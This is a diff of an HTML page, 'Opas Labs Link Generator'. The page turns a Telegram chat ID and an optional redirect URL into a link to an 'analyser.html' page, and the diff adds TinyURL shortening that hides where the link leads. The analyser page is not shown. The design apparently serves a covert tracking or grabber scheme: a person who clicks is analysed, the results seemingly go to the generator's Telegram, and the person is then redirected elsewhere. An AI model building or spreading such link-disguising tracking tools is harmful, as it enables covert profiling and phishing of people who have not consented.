@@ -1,39 +1,113 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Opas Labs - Link Generator</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Opas Labs — Link Generator</title>
   <style>
-    body { font-family: Arial, sans-serif; text-align: center; background: #f5f5f5; margin: 0; padding: 0; }
-    h1 { background: #333; color: white; padding: 15px; margin: 0; }
-    .box { margin-top: 50px; background: white; padding: 20px; border-radius: 10px; display: inline-block; box-shadow: 0 0 10px rgba(0,0,0,0.2); }
-    input { display: block; margin: 10px auto; padding: 10px; width: 80%; border: 1px solid #ccc; border-radius: 5px; }
-    button { padding: 10px 20px; margin-top: 10px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
-    button:hover { background: #0056b3; }
-    #result { margin-top: 20px; word-break: break-all; }
+    body {
+      font-family: Arial, sans-serif;
+      background: #f6f7fb;
+      color: #333;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+    }
+    h1 {
+      color: #111;
+      margin-bottom: 20px;
+    }
+    label {
+      font-weight: bold;
+      display: block;
+      margin-top: 15px;
+    }
+    input {
+      width: 300px;
+      padding: 8px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 15px;
+      margin-top: 5px;
+    }
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      font-size: 16px;
+      background-color: #0078ff;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #005fcc;
+    }
+    #result {
+      margin-top: 25px;
+      text-align: center;
+      word-break: break-all;
+    }
+    a {
+      color: #0078ff;
+      text-decoration: none;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
   </style>
 </head>
 <body>
   <h1>Opas Labs</h1>
-  <div class="box">
-    <label>Telegram Chat ID 
-      (<a href="https://t.me/opaslabs_bot?start=start" target="_blank">Get your Chat ID</a>)
-    </label>
-    <input type="text" id="chatId" placeholder="Enter your Telegram Chat ID">
-    <label>Redirect URL (Optional)</label>
-    <input type="text" id="redirectUrl" placeholder="https://example.com">
-    <button onclick="generateLink()">Generate Link</button>
-    <div id="result"></div>
-  </div>
+
+  <label>Telegram Chat ID (<a href="https://t.me/opaslabs_bot?start=start" target="_blank">Get your Chat ID</a>)</label>
+  <input type="text" id="chatId" placeholder="Enter Chat ID" />
+
+  <label>Redirect URL (Optional)</label>
+  <input type="text" id="redirectUrl" placeholder="https://example.com" />
+
+  <button onclick="generateLink()">Generate Link</button>
+
+  <div id="result"></div>
+
   <script>
-function generateLink() {
-  const chatId = document.getElementById("chatId").value.trim();
-  const redirectUrl = document.getElementById("redirectUrl").value.trim();
-  if (!chatId) { alert("Please enter your Telegram Chat ID"); return; }
-  const analyserLink = `${location.origin}/analyser.html?chat=${encodeURIComponent(chatId)}&redirect=${encodeURIComponent(redirectUrl)}`;
-  document.getElementById("result").innerHTML = `<p><strong>Generated Link:</strong></p><a href="${analyserLink}" target="_blank">${analyserLink}</a>`;
-}
+    async function shortenLink(longUrl) {
+      try {
+        const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longUrl)}`);
+        if (!res.ok) throw new Error('Shortening failed');
+        return await res.text();
+      } catch (err) {
+        console.warn('TinyURL failed, returning original link:', err);
+        return longUrl;
+      }
+    }
+
+    async function generateLink() {
+      const chatId = document.getElementById("chatId").value.trim();
+      const redirectUrl = document.getElementById("redirectUrl").value.trim();
+
+      if (!chatId) {
+        alert("Please enter your Telegram Chat ID");
+        return;
+      }
+
+      const analyserLink = `${location.origin}/analyser.html?chat=${encodeURIComponent(chatId)}&redirect=${encodeURIComponent(redirectUrl)}`;
+
+      document.getElementById("result").innerHTML = `<p>Generating short link...</p>`;
+
+      const shortLink = await shortenLink(analyserLink);
+
+      document.getElementById("result").innerHTML = `
+        <p><strong>Full Link:</strong></p>
+        <a href="${analyserLink}" target="_blank">${analyserLink}</a>
+        <p><strong>Short Link:</strong></p>
+        <a href="${shortLink}" target="_blank">${shortLink}</a>
+      `;
+    }
   </script>
 </body>
 </html>
